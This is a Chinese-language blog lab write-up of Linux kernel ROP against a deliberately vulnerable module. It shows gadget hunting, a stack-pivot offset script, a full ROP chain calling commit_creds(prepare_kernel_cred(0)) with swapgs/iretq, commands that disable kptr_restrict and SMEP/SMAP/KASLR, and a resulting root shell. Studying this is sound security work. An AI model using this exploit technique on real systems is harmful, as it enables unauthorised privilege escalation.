---
title: Linux Kernel ROP
date: 2017-08-06 19:47:38
tags:
- kernel rop
categories:
- kernel_exploit
---

SMEP(Supervisor Mode Execution Protection)的绕过方法一是直接修改CR4的值，二是直接在内核ROP(有点难)。修改CR4最终还是会用到ROP，所以还是先研究下内核ROP。

## Intro
内核的ROP跟用户空间的ROP没太大区别，差别很小，需要注意的是内核传参一般是通过寄存器而不是栈。我们在实验中通过ROP在内核中执行下面的函数(privilege escalation)。虽然实际中不会有这么简单，但是我们首先可以通过ROP来改变CR4的值来关闭SMEP，然后就可以在用户空间执行payload提权了。
<!-- more -->
```c
void __attribute__((regparm(3))) payload() {
        commit_creds(prepare_kernel_cred(0));
}
```
一般来说，rop chain是如下情况：
```
|----------------------|
| pop rdi; ret         |<== low mem
|----------------------|
| NULL                 |
|----------------------|
| addr of              |
| prepare_kernel_cred()|
|----------------------|
| mov rdi, rax; ret    |
|----------------------|
| addr of              |
| commit_creds()       |<== high mem
|----------------------|
```
因为vmlinux文件过大，每次用ROPgadget都要花很长时间，所以就一次性把所有的gadget都写到一个文件中：
```
ROPgadget --binary vmlinux > ropgadget
```
但是在vmlinux找不到mov rdi, rax; ret这个gadget，只找到了如下的gadget：
```shell
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ grep ': pop rdi ; ret' ropgadget 
0xffffffff81016bc5 : pop rdi ; ret

w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ grep ': pop rdx ; ret' ropgadget 
0xffffffff810e00d1 : pop rdx ; ret

w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ grep 'mov rdi, rax' ropgadget
0xffffffff8118e3a0 : mov rdi, rax ; call r10
0xffffffff8142b6d1 : mov rdi, rax ; call r12
0xffffffff8130217b : mov rdi, rax ; call r14
0xffffffff81d48ba6 : mov rdi, rax ; call r15
0xffffffff810d5f34 : mov rdi, rax ; call r8
0xffffffff8117f534 : mov rdi, rax ; call r9
0xffffffff8133ed6b : mov rdi, rax ; call rbx
0xffffffff8105f69f : mov rdi, rax ; call rcx
0xffffffff810364bf : mov rdi, rax ; call rdx
```
其中的vmlinux文件是由[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)解压boot/vmlinuz*(本身是压缩的内核文件)文件得到的：
```shell
sudo ./extract-vmlinux /boot/vmlinuz-3.13.0-119-generic > vmlinux
```
所以rop chain有点改变：
```
|----------------------|
| pop rdi; ret         |<== low mem
|----------------------|
| NULL                 |
|----------------------|
| addr of              |
| prepare_kernel_cred()|
|----------------------|
| pop rdx; ret         |
|----------------------|
| addr of              |
| commit_creds()       |
|----------------------|
| mov rdi, rax;        |
| call rdx             |<== high mem
|----------------------|
```
需要注意的是在版本较高的linux中，/proc/kallsyms文件中符号的地址都为0，所以也就无法查找prepare_kernel_cred和commit_creds的地址，但是我们通过设置/proc/sys/kernel/kptr_restrict文件中的值来读取符号地址:
```
echo 0 > /proc/sys/kernel/kptr_restrict
```
然后我们就可以读取内核导出函数的地址了：
```
root@w0lfzhang666:/home/w0lfzhang# cat /proc/kallsyms | grep commit_creds
ffffffff81094350 T commit_creds
ffffffff81b095d0 R __ksymtab_commit_creds
ffffffff81b253e0 r __kcrctab_commit_creds
ffffffff81b348f5 r __kstrtab_commit_creds
```

## Example
好吧，这个例子应该是该[博客](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/)的作者根据此[文档](http://cyseclabs.com/slides/smep_bypass.pdf)中的cve-2013-1763写的。所有的源码及exp都可在[github](https://github.com/vnik5287/kernel_rop)上下载。漏洞存在如下函数：
```c
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long args) {
	struct drv_req *req;
	void (*fn)(void);
	
	switch(cmd) {
	case 0:
		req = (struct drv_req *)args;
		printk(KERN_INFO "size = %lx\n", req->offset);
        printk(KERN_INFO "fn is at %p\n", &ops[req->offset]);
		fn = &ops[req->offset];
		fn();
		break;
	default:
		break;
	}

	return 0;
}
```
req->offset没有检查，所以可导致数组越界访问。如果我们精心设置offset的值，那我们几乎可以执行内核空间的任意代码。这个东东看了一天才看懂，到最后自己试验还没成功...直接调试这类LKM又不怎么熟练，郁闷。
因为只能在内核中执行代码，而我们无法将rop chain放到内核空间，所以就只能把rop chain放到用户空间中去，怎么放？Stack Pivot！
常见的stack pivot指令大致有以下几类：
```asm
mov rXx, rsp ; ret
add rsp, ...; ret
xchg rXx, rsp ; ret(xchg eXx, esp ; ret)
xchg rsp, rXx ; ret(xchg esp, eXx ; ret)
```
在64位系统中，xchg rXx, rsp(xchg rsp, rXx ; ret)是个骚操作，只使用32位的寄存器，即xchg eXx, esp或xchg esp, eXx。如果rXx包含有效的内核地址，那么该xchg指令将把rsp设置为rXx的低32位的值(rax也被设置为rsp的低32位)。我们只需要xchg eax, esp这类操作32位寄存器的指令即可。这操作很骚啊~~(虽然不知道咋搞得~)
```shell
   0x400080 <_start>:	movabs rax,0xffffffff00400000
=> 0x40008a <_start+10>:	xchg   esp,eax
   0x40008c:	add    BYTE PTR [rsi],ch
   0x40008e:	jae    0x400109
   0x400090:	ins    DWORD PTR es:[rdi],dx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd30 --> 0x1 
0008| 0x7fffffffdd38 --> 0x7fffffffe0e4 ("/home/w0lfzhang/Desktop/kernel_exploit/examples/ROP/a")
0016| 0x7fffffffdd40 --> 0x0 
......

   0x400080 <_start>:	movabs rax,0xffffffff00400000
   0x40008a <_start+10>:	xchg   esp,eax
=> 0x40008b:	add    BYTE PTR [rsi],ch
   0x40008d:	jae    0x400108
   0x40008f:	ins    DWORD PTR es:[rdi],dx
   0x400090:	je     0x4000f3
   0x400092:	(bad)
[------------------------------------stack-------------------------------------]
0000| 0x400000 --> 0x10102464c457f   <== rsp changed
0008| 0x400008 --> 0x0 
0016| 0x400010 --> 0x1003e0002 
......
```


所以我们第一步就是让fn()执行stack pivot指令，执行完这个指令后，rsp重定向到用户空间，然后内核会执行用户空间精心布置的rop chain。我们把这类指令写到文件中，然后找出一个合适的gadget：
```
cat ropgadget | grep ': xchg eax, esp ; ret' > gadgets

gdb-peda$ x/10i *device_ioctl+105
   0x14a <device_ioctl+105>:	mov    rax,QWORD PTR [rbp-0x10]
   0x14e <device_ioctl+109>:	mov    rax,QWORD PTR [rax]
   0x151 <device_ioctl+112>:	shl    rax,0x3
   0x155 <device_ioctl+116>:	add    rax,0x0
   0x15b <device_ioctl+122>:	mov    QWORD PTR [rbp-0x8],rax
   0x15f <device_ioctl+126>:	mov    rax,QWORD PTR [rbp-0x8]
   0x163 <device_ioctl+130>:	call   rax
   0x165 <device_ioctl+132>:	nop
   0x166 <device_ioctl+133>:	mov    eax,0x0
   0x16b <device_ioctl+138>:	leave 

```
为什么说找个合适的gadget? 因为并不是所有的gadget都满足的，注意ops是指针数组，是8字节对齐的，所以我们找的gadget地址必须也要8字节对齐。可用以下脚本找到合适的gadget及计算出相应的offset：
```python
#find_offset.py

#!/usr/bin/env python
import sys

base_addr = int(sys.argv[1], 16)

f = open(sys.argv[2], 'r') # gadgets

for line in f.readlines():
        target_str, gadget = line.split(':')
        target_addr = int(target_str, 16)

        # check alignment
        if target_addr % 8 != 0:
                continue

        offset = (target_addr - base_addr) / 8
        print 'offset =', (1 << 64) + offset
        print 'gadget =', gadget.strip()
        print 'stack addr = %x' % (target_addr & 0xffffffff)
        break
```
刚开始不懂为什么那个offset要进行1<<64这个骚操作，后来注意到offset是unsigned long，但是好像不要1<<64也没多大关系.

stack_addr是需要mmmap的用户空间地址。因为这个gadget中的ret后有操作数，所以我们需要在rop chain中做适当的改变。
```c
	fake_stack = (unsigned long *)(stack_addr);
	*fake_stack ++= 0xffffffff81016bc5UL; /* pop %rdi; ret */

	fake_stack = (unsigned long *)(stack_addr + 0x14ff + 8);

	*fake_stack ++= 0x0UL;                /* NULL */ 
	*fake_stack ++= 0xffffffff81094630UL; /* prepare_kernel_cred() */

	*fake_stack ++= 0xffffffff810e00d1UL; /* pop %rdx; ret */
	//*fake_stack ++= 0xffffffff81095190UL; /* commit_creds() */
	*fake_stack ++= 0xffffffff81094356UL; // commit_creds() + 2 instructions

	*fake_stack ++= 0xffffffff810364bfUL; /* mov %rax, %rdi; call %rdx */
```
至于为什么要把commit_creds的地址后移两个指令。因为当执行完commit_creds后，内核控制流就转移到call rdx的后一条指令了，但是我们还需要在rop chain中执行必要的指令。我们看看commit_creds函数的汇编代码：
```shell                
gdb-peda$ x/10i 0xFFFFFFFF81094350
   0xffffffff81094350:	call   0xffffffff8173da00
   0xffffffff81094355:	push   rbp
   0xffffffff81094356:	mov    rbp,rsp
   0xffffffff81094359:	push   r13
   0xffffffff8109435b:	mov    r13,QWORD PTR gs:0xb840
   0xffffffff81094364:	push   r12
   0xffffffff81094366:	push   rbx
   0xffffffff81094367:	mov    r12,QWORD PTR [r13+0x4b0]
   0xffffffff8109436e:	cmp    r12,QWORD PTR [r13+0x4b8]
   0xffffffff81094375:	jne    0xffffffff8109454f
```
所以我们直接跳过push rbp指令，这样当函数返回时就会把call指令压入的返回地址pop，从而继续执行我们得rop chain。很骚的操作~
执行完上述的rop chain，我们需要做的事返回用户空间执行system("/bin/sh")，这时就需要用到iretq(64 bit)操作了。我们只需要在stack上布置一个trap_frame即可。
```
|----------------------|
| rip                  |<== low mem
|----------------------|
| cs                   |
|----------------------|
| eflags               |      
|----------------------|
| rsp                  |
|----------------------|
| ss                   |<== high mem
|----------------------|
```
最后需要注意的是，在64bit的系统中执行iret指令前需要执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。
最后，将所有的rop chain放在一起：
```c
 save_state();
	fake_stack = (unsigned long *)(stack_addr);
	*fake_stack ++= 0xffffffff81016bc5UL; /* pop %rdi; ret */

	fake_stack = (unsigned long *)(stack_addr + 0x14ff + 8);

	*fake_stack ++= 0x0UL;                /* NULL */ 
	*fake_stack ++= 0xffffffff81094630UL; /* prepare_kernel_cred() */

	*fake_stack ++= 0xffffffff810e00d1UL; /* pop %rdx; ret */
	//*fake_stack ++= 0xffffffff81095190UL; /* commit_creds() */
	*fake_stack ++= 0xffffffff81094356UL; // commit_creds() + 2 instructions

	*fake_stack ++= 0xffffffff810364bfUL; /* mov %rax, %rdi; call %rdx */

 *fake_stack ++= 0xffffffff810515e4UL; // swapgs 
 //*fake_stack ++= 0xdeadbeefUL;       // dummy placeholder 

	*fake_stack ++= 0xffffffff81735807UL; /* iretq */
	*fake_stack ++= (unsigned long)shell; /* spawn a shell */
	*fake_stack ++= user_cs;              /* saved CS */
	*fake_stack ++= user_rflags;          /* saved EFLAGS */
 *fake_stack ++= (unsigned long)(temp_stack+0x5000000);  /* mmaped stack region in user space */
 *fake_stack ++= user_ss;              /* saved SS */
```
可惜最后在我的系统上没试验成功，不知道啥原因~
```
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ dmesg | grep ops
[ 8933.372862] addr(ops) = ffffffffa035a340

w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ ./find_offset.py ffffffffa035a340 gadgets 
offset = 18446744073644211981
gadget:  0xffffffff810d9ba8 : xchg eax, esp ; ret 0x14ff

stack addr = 810d9ba8

w0lfzhang@w0lfzhang666:~/Desktop/kernel_exploit/examples/ROP$ ./rop_exploit 18446744073644211981 ffffffffa035a340
array base address = 0xffffffffa035a340
stack address = 0x810d9ba8
Killed
```
后来过了发现是smap的原因，关了smap就可以了。因为kernel stack被转移到用户空间，所以当访问stack上的数据时会触发内核page fault。不过这次我是在ubuntu 12.04.5上做的实验，刚开始也是失败了，后来关了smap后就成功了。
```
to disable smep/smap/kaslr in linux:
add 'nosmep/nosmap/nokaslr' here: GRUB_CMDLINE_LINUX="nosmep/nosmap/nokaslr" in /etc/default/grub, then update-grub2.
```
smap确实是被关闭了：
```
w0lfzhang@w0lfzhang-666:~$ cat /proc/cpuinfo | grep smap
w0lfzhang@w0lfzhang-666:~$ 
```
然后我们执行exp：
```
w0lfzhang@w0lfzhang-666:~/Desktop/kernel_rop$ ./rop_exploit 18446744073644207075 ffffffffa0318340
array base address = 0xffffffffa0318340
stack address = 0x8108e258
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
所以说，如果在内核态执行用户空间的rop chain在smap开启了是行不通的，gg~

## Links
[Linux Kernel ROP - Ropping your way to # (Part 1)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/)
[Linux Kernel ROP - Ropping your way to # (Part 2)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/)
[Linux内核ROP姿势详解（二）](http://www.freebuf.com/articles/system/135402.html)
